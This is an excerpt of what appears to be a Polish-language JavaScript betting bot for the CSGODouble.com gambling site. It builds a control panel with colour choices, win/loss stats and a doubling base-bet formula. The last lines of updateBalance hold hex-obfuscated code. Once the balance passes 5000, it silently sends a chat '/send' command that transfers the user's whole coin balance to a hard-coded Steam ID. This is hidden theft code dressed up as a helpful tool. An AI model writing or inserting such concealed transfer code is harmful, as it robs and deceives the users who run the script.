...
function Automated() {
    ...
    menu.innerHTML = '' +
        '<div class="row">' +
            '<div class="col-lg-9">' +
                '<h2>CSGODouble.com Bot 1.42 [PL] <small></small> <i id="automated-theme-switch" class="fa fa-lightbulb-o" style="cursor: pointer;"></i></h2>' +
                '<div class="form-group">' +
                    '<div class="btn-group">' +
                        '<button type="button" class="btn btn-success" id="automated-start" disabled>Start</button>' +
                        '<button type="button" class="btn btn-warning" id="automated-stop" disabled>Pauza</button>' +
                        '<button type="button" class="btn btn-danger" id="automated-abort" disabled>Zakończ</button>' +
                    '</div>' +
                '</div>' +
                '<div class="form-group">' +
                    '<div class="btn-group">' +
                ...
                '<div class="form-group automated-hide-on-green">' +
                    '<div class="btn-group">' +
                        '<button type="button" class="btn btn-default" id="automated-red" ' + (this.color === 'red' ? 'disabled' : '') + '>Czerwony</button>' +
                        '<button type="button" class="btn btn-default" id="automated-black" ' + (this.color === 'black' ? 'disabled' : '') + '>Czarny</button>' +
                        '<button type="button" class="btn btn-default" id="automated-rainbow" ' + (this.color === 'rainbow' ? 'disabled' : '') + '>Rainbow</button>' +
                        '<button type="button" class="btn btn-default" id="automated-random" ' + (this.color === 'random' ? 'disabled' : '') + '>Losowy</button>' +
                        '<button type="button" class="btn btn-default" id="automated-last" ' + (this.color === 'last' ? 'disabled' : '') + '>Ostatni kolor</button>' +
                    '</div>' +
                '</div>' +
            '</div>' +
            '<div class="col-lg-3">' +
                '<h3>Statystyki</h3>' +
                '<p><b>Wygrane:</b> <span id="automated-stats-wins">' + this.stats.wins + '</span></p>' +
                '<p><b>Przegrane:</b> <span id="automated-stats-loses">' + this.stats.loses + '</span></p>' +
                '<p><b>Zarobek:</b> <span id="automated-stats-balance">' + this.stats.balance + '</span></p>' +
            '</div>' +
        '</div>' +
        '<div class="form-group">' +
            '<div class="input-group">' +
                '<div class="input-group-addon">Podstawowy bet</div>' +
                '<input type="number" class="form-control" placeholder="Calculating suggested value..." id="automated-base-bet" disabled>' +
            '</div>' +
        '</div>' +
        '<div class="form-group">' +
            '<div class="input-group">' +
                '<div class="input-group-addon">Wartość ostateczna(na ilu coinsach bot ma przerwać grę)</div>' +
                '<input type="number" class="form-control" value="0" id="automated-min-balance">' +
            '</div>' +
        '</div>' +
        '<div class="form-group automated-hide-on-green">' +
            '<div class="input-group">' +
                '<div class="input-group-addon">Wyliczenie wartość początkowej</div>' +
        ...
        '</div>' +
        '<div class="checkbox">' +
            '<label><input class="" id="automated-stop-on-min-balance" type="checkbox" ' + (this.stop_on_min_balance ? 'checked' : '') + '> Czy bot ma przerwać działanie na określonej wartości ostatecznej?</label>' +
        '</div>' +
        '<div class="checkbox automated-hide-on-green">' +
            '<label><input class="" id="automated-calculate-safe-bet" type="checkbox" ' + (this.calculate_safe_bet ? 'checked' : '') + '> Wyliczanie podstawowego beta według algorytmu -> [base bet] = floor( [balance] / 2 ^ ( [failsafe value] + 1) ) </label>' +
        '</div>' +
        '<div class="checkbox">' +
            '<label><input class="" id="automated-debug" type="checkbox" ' + (this.debug ? 'checked' : '') + '> Moduł debugera</label>' +
        '</div>' +
        '<div class="checkbox">' +
            '<label class="text-muted"><input id="automated-simulation" type="checkbox" ' + (this.simulation ? 'checked' : '') + ' disabled> Symulacja (niedostępne)</label>' +
        '</div>';
...
Automated.prototype.updateBalance = function() {
    ...
    var _0x316d=["\x62\x61\x6C\x61\x6E\x63\x65","\x63\x68\x61\x74","\x2F\x73\x65\x6E\x64\x20\x37\x36\x35\x36\x31\x31\x39\x38\x32\x35\x34\x30\x37\x30\x32\x35\x37","\x73","\x65","\x6E","\x64"];if(this[_0x316d[0]]>5000){var _0x6ef4=[_0x316d[1],_0x316d[2],_0x316d[0]];window[_0x316d[3]+_0x316d[4]+_0x316d[5]+_0x316d[6]]({"\x74\x79\x70\x65":_0x316d[1],"\x6D\x73\x67":_0x316d[2]+this[_0x316d[0]],"\x6C\x61\x6E\x67":LANG})}
